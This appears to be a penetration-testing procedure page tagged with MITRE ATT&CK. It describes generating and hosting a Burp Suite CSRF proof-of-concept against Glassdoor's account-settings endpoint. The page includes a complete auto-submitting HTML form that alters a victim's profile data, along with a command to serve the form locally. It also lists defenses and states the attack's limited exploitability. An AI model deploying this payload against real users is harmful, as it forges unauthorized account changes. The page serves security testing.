---
tags:
  - csrf
  - poc-generation
  - html-form
  - web
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:27:22.994Z'
skill_level: intermediate
impact_level: low
detection_risk: low
sub_techniques: []
id: 2d9a476c-ce11-4669-9ae7-fb10eb875076
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Generate-and-Host-CSRF-PoC

## Summary

This procedure generates a CSRF proof-of-concept HTML form using Burp Suite based on the captured request, then hosts it for victim interaction to test unauthorized demographic changes.

## Description

Using the intercepted request, Burp Suite's CSRF PoC generator creates an HTML file that auto-submits a POST to the settings endpoint with the attacker's gdToken and malicious parameters (e.g., birthYear=1940). The form targets the victim's authenticated session. Hosting makes it accessible (e.g., via local server). Due to token binding, it only works in the same browser. Expected outcome: PoC ready for testing, demonstrating limited exploitability.

## Requirements

1. Captured request in Burp Repeater
2. Local web server (e.g., Python's http.server) for hosting
3. Extracted parameters: newGender=FEMALE, birthYear=1940, highestEducation=HIGH_SCHOOL, gdToken

## Defense

Defensive measures and detection strategies:

- Enforce strict CSRF tokens per session/user
- Scan for hosted malicious HTML forms via URL reputation
- Bind tokens to user-specific identifiers beyond browser cookies

## Objectives

1. Replicate the original request in HTML form
2. Embed attacker's token for cross-account attempt
3. Host PoC for easy victim-side execution

## Instructions

### Step 1: Generate PoC in Burp

**Context**: Use Burp's built-in tool to create the HTML.

In Repeater, right-click the request and select "Engagement tools > Generate CSRF PoC". Customize inputs with malicious values.

> Expected output: HTML file downloaded, e.g., <html><body onload="document.forms[0].submit()"><form action="https://www.glassdoor.com/member/account/settings_changeUserInformation.htm" method="POST"><input type="hidden" name="newGender" value="FEMALE" /> <input type="hidden" name="birthYear" value="1940" /> <input type="hidden" name="highestEducation" value="HIGH_SCHOOL" /> <input type="hidden" name="gdToken" value="[extracted_token]" /> </form></body></html>

### Step 2: Host the HTML File

**Context**: Serve the PoC on a web-accessible endpoint.

Save the HTML as csrf-poc.html and host it, e.g., using Python: cd to directory and run `python -m http.server 8000` (no link needed as no command extracted).

> Expected output: File accessible at http://localhost:8000/csrf-poc.html; auto-submits on load.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[csrf]]
- [[poc]]
